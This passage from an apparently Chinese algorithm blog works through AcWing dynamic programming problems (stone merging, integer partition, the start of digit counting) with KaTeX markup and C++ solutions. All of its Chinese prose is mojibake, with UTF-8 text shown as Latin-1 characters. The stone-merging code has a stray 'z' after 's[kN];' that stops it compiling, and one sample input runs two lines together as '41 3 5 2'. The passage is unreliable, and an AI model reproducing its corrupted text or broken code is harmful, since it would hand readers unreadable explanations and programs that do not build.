class="mord">3</span></span></span></span> å †ï¼Œåˆ™ä»£ä»·ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span>ï¼Œå¾—åˆ° <code>4 7</code>ï¼Œæœ€åä¸€æ¬¡åˆå¹¶ä»£ä»·ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span>ï¼Œæ€»ä»£ä»·ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>+</mo><mn>7</mn><mo>+</mo><mn>11</mn><mo>=</mo><mn>22</mn></mrow><annotation encoding="application/x-tex">4+7+11=22</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">22</span></span></span></span>ã€‚</p><p>é—®é¢˜æ˜¯ï¼šæ‰¾å‡ºä¸€ç§åˆç†çš„æ–¹æ³•ï¼Œä½¿æ€»çš„ä»£ä»·æœ€å°ï¼Œè¾“å‡ºæœ€å°ä»£ä»·ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡Œä¸€ä¸ªæ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> è¡¨ç¤ºçŸ³å­çš„å †æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ä¸ªæ•°ï¼Œè¡¨ç¤ºæ¯å †çŸ³å­çš„è´¨é‡(å‡ä¸è¶…è¿‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1000</mn></mrow><annotation encoding="application/x-tex">1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>)ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å°ä»£ä»·ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>300</mn></mrow><annotation encoding="application/x-tex">1 \le N \le 300</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">300</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>41 3 5 2</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>22</code></pre><h3 id="åŒºé—´DP-2">åŒºé—´DP</h3><p>åŒºé—´DPï¼šå®šä¹‰çŠ¶æ€æ—¶å®šä¹‰çš„æ˜¯ä¸€ä¸ªç©ºé—´ã€‚</p><ul><li><p>çŠ¶æ€è¡¨ç¤º<code>f[i][j]</code></p><ul><li>é›†åˆï¼šæ‰€æœ‰å°†<code>ç¬¬iå †çŸ³å­</code>åˆ°<code>ç¬¬jå †çŸ³å­</code>åˆå¹¶æˆä¸€å †çŸ³å­çš„åˆå¹¶æ–¹å¼ã€‚</li><li>å±æ€§ï¼šMin</li></ul></li><li><p>çŠ¶æ€è®¡ç®—</p><ul><li><p>ä»¥æœ€åä¸€æ¬¡åˆ†ç•Œçº¿çš„ä½ç½®æ¥åˆ†ç±»</p></li><li><p>åˆ†ç•Œçº¿kå¯ä»¥ç¡®å®š<code>[iï¼Œk]</code>å’Œ<code>[k+1ï¼Œr]</code>ä¸¤ä¸ªåŒºé—´<br><code>f[i][j] = min(f[i][k] + f[k+1][j] + s[k] - s[i-1]), k=i~j-1</code></p><p><strong>æ³¨æ„ï¼šå³è¾¹ç•Œçš„èµ·ç‚¹æ˜¯<code>k+1</code></strong></p></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">310</span>;</span><br><span class="line"><span class="type">int</span> n, s[kN];z</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s[i]);</span><br><span class="line">    s[i] += s[i - <span class="number">1</span>];  <span class="comment">// å‰ç¼€å’Œ</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// è€ƒè™‘å¦‚ä½•ä½¿å¾—åœ¨è®¡ç®—åé¢çš„çŠ¶æ€æ—¶, å‰é¢çš„çŠ¶æ€å·²è¢«è®¡ç®—: å¤–å¾ªç¯æšä¸¾len</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> len = <span class="number">2</span>; len &lt;= n; len++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i + len - <span class="number">1</span> &lt;= n; i++) &#123;</span><br><span class="line">      <span class="type">int</span> l = i, r = i + len - <span class="number">1</span>;</span><br><span class="line">      f[l][r] = <span class="number">2e9</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = l; k &lt; r; k++) &#123;  <span class="comment">// kæšä¸¾å·¦åŠéƒ¨åˆ†æœ€åä¸€ä¸ªçŸ³å­çš„ä½ç½®</span></span><br><span class="line">        f[l][r] = <span class="built_in">min</span>(f[l][r], f[l][k] + f[k + <span class="number">1</span>][r] + s[r] - s[l - <span class="number">1</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[<span class="number">1</span>][n]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="è®¡æ•°ç±»DP">è®¡æ•°ç±»DP</h1><h2 id="AcWing-900-æ•´æ•°åˆ’åˆ†"><a href="https://www.acwing.com/problem/content/902/">AcWing 900. æ•´æ•°åˆ’åˆ†</a></h2><p>ä¸€ä¸ªæ­£æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å¯ä»¥è¡¨ç¤ºæˆè‹¥å¹²ä¸ªæ­£æ•´æ•°ä¹‹å’Œï¼Œå½¢å¦‚ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>n</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo>+</mo><mi>n</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo>+</mo><mo>â€¦</mo><mo>+</mo><mi>n</mi><mi mathvariant="normal">_</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">n = n\_1 + n\_2 + â€¦ + n\_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9544em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord">_1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9544em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord">_2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ï¼Œå…¶ä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo>â‰¥</mo><mi>n</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo>â‰¥</mo><mo>â€¦</mo><mo>â‰¥</mo><mi>n</mi><mi mathvariant="normal">_</mi><mi>k</mi><mo separator="true">,</mo><mi>k</mi><mo>â‰¥</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n\_1 \ge n\_2 \ge â€¦ \ge n\_k, k \ge 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9544em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord">_1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9544em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord">_2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ã€‚</p><p>æˆ‘ä»¬å°†è¿™æ ·çš„ä¸€ç§è¡¨ç¤ºç§°ä¸ºæ­£æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„ä¸€ç§åˆ’åˆ†ã€‚</p><p>ç°åœ¨ç»™å®šä¸€ä¸ªæ­£æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ï¼Œè¯·ä½ æ±‚å‡º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å…±æœ‰å¤šå°‘ç§ä¸åŒçš„åˆ’åˆ†æ–¹æ³•ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å«ä¸€ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å«ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ€»åˆ’åˆ†æ•°é‡ã€‚</p><p>ç”±äºç­”æ¡ˆå¯èƒ½å¾ˆå¤§ï¼Œè¾“å‡ºç»“æœè¯·å¯¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>+</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">10^9 + 7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> å–æ¨¡ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹:</strong></p><pre><code>5</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>7</code></pre><h3 id="ç®—æ³•1-å®Œå…¨èƒŒåŒ…è§£æ³•-æ¨è">ç®—æ³•1 å®Œå…¨èƒŒåŒ…è§£æ³•(æ¨è)</h3><p>è½¬åŒ–ä¸ºå®Œå…¨èƒŒåŒ…é—®é¢˜ï¼šä»1 ~ n è¿™äº›æ•°å»é€‰ï¼Œå¯ä»¥é€‰ä»»æ„å¤šä¸ªï¼Œä½¿å¾—æ€»å’Œæ°å¥½ä¸ºn</p><ul><li><p>çŠ¶æ€è¡¨ç¤º<code>f[i][j]</code></p><ul><li>é›†åˆ åªä»1ï½i ä¸­é€‰ï¼Œæ€»å’Œæ°å¥½ç­‰äºjçš„æ–¹æ¡ˆ</li><li>å±æ€§ Num</li></ul></li><li><p>çŠ¶æ€è®¡ç®— <code>f[i][j] = f[i - 1][j] + f[i][j - i]</code></p><ul><li><p>æŒ‰ç…§ié€‰å‡ ä¸ªè¿›è¡Œåˆ’åˆ†</p></li><li><p>é€‰æ‹©kä¸ªi <code>f[i - 1][j - k*i]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å› ä¸º</span><br><span class="line">f[i][j] = f[i-1][j] + f[i-1][j-i] + f[i-1][j-2i] +...+ f[i-1][j-si]</span><br><span class="line">f[i][j-i] =           f[i-1][j-i] + f[i-1][j-2i] +...+ f[i-1][j-si]</span><br><span class="line">æ‰€ä»¥</span><br><span class="line">f[i][j] = f[i - 1][j] + f[i][j - i]</span><br><span class="line">ä¸€ç»´ä¼˜åŒ–</span><br><span class="line">f[j] = f[j] + f[j - i], jä»å°åˆ°å¤§å¾ªç¯</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>, kMOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  f[<span class="number">0</span>] = <span class="number">1</span>;  <span class="comment">// åˆå§‹åŒ–,é€‰æ‹©0ä¸ªæ•°ä½¿å¾—ä½“ç§¯ä¸º0æœ‰1ç§æƒ…å†µ</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt;= n; j++) &#123;</span><br><span class="line">      f[j] = (f[j] + f[j - i]) % kMOD;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç®—æ³•2">ç®—æ³•2</h3><ul><li>çŠ¶æ€è¡¨ç¤º<code>f[i][j]</code><ul><li>é›†åˆï¼š<strong>æ€»å’Œä¸º i , æ€»ä¸ªæ•°ä¸º j</strong> çš„æ–¹æ¡ˆ</li><li>å±æ€§ï¼šNum</li></ul></li><li>çŠ¶æ€è®¡ç®—<ul><li>æŒ‰åˆ’åˆ†ç»“æœä¸­<strong>æœ€å°å€¼æ˜¯å¦ä¸º1</strong>è¿›è¡Œåˆ†ç±»</li><li>æœ€å°å€¼ä¸º1 <code>f[i - 1][j - 1]</code></li><li>æœ€å°å€¼é1 <code>f[i - j][j]</code>, å³è¿™jä¸ªåˆ’åˆ†ä¸­æ¯ä¸€éƒ¨åˆ†éƒ½å¯ä»¥æå–å‡ºä¸€ä¸ª1å‡ºæ¥</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>, kMOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">int</span> n, f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  f[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">      f[i][j] = <span class="built_in">max</span>(f[i][j], f[i - <span class="number">1</span>][j - <span class="number">1</span>] + f[i - j][j]) % kMOD;  <span class="comment">// å–æ¨¡</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    res = (res + f[n][i]) % kMOD;  <span class="comment">// ç»“æœæ˜¯ å„è‡ªåˆ’åˆ†ä¸ªæ•° çš„æ–¹æ¡ˆæ•°ä¹‹å’Œ</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ•°ä½ç»Ÿè®¡DP">æ•°ä½ç»Ÿè®¡DP</h1><h2 id="AcWing-338-è®¡æ•°é—®é¢˜"><a href="https://www.acwing.com/problem/content/340/">AcWing 338. è®¡æ•°é—®é¢˜</a></h2><p>ç»™å®šä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span>ï¼Œæ±‚ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> ä¹‹é—´çš„æ‰€æœ‰æ•°å­—ä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>âˆ¼</mo><mn>9</mn></mrow><annotation encoding="application/x-tex">0 \sim 9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">9</span></span></span></span> çš„å‡ºç°æ¬¡æ•°ã€‚</p><p>ä¾‹å¦‚ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mn>1024</mn><mtext>ï¼Œ</mtext><mi>b</mi><mo>=</mo><mn>1032</mn></mrow><annotation encoding="application/x-tex">a=1024ï¼Œb=1032</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">1024</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1032</span></span></span></span>ï¼Œåˆ™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> 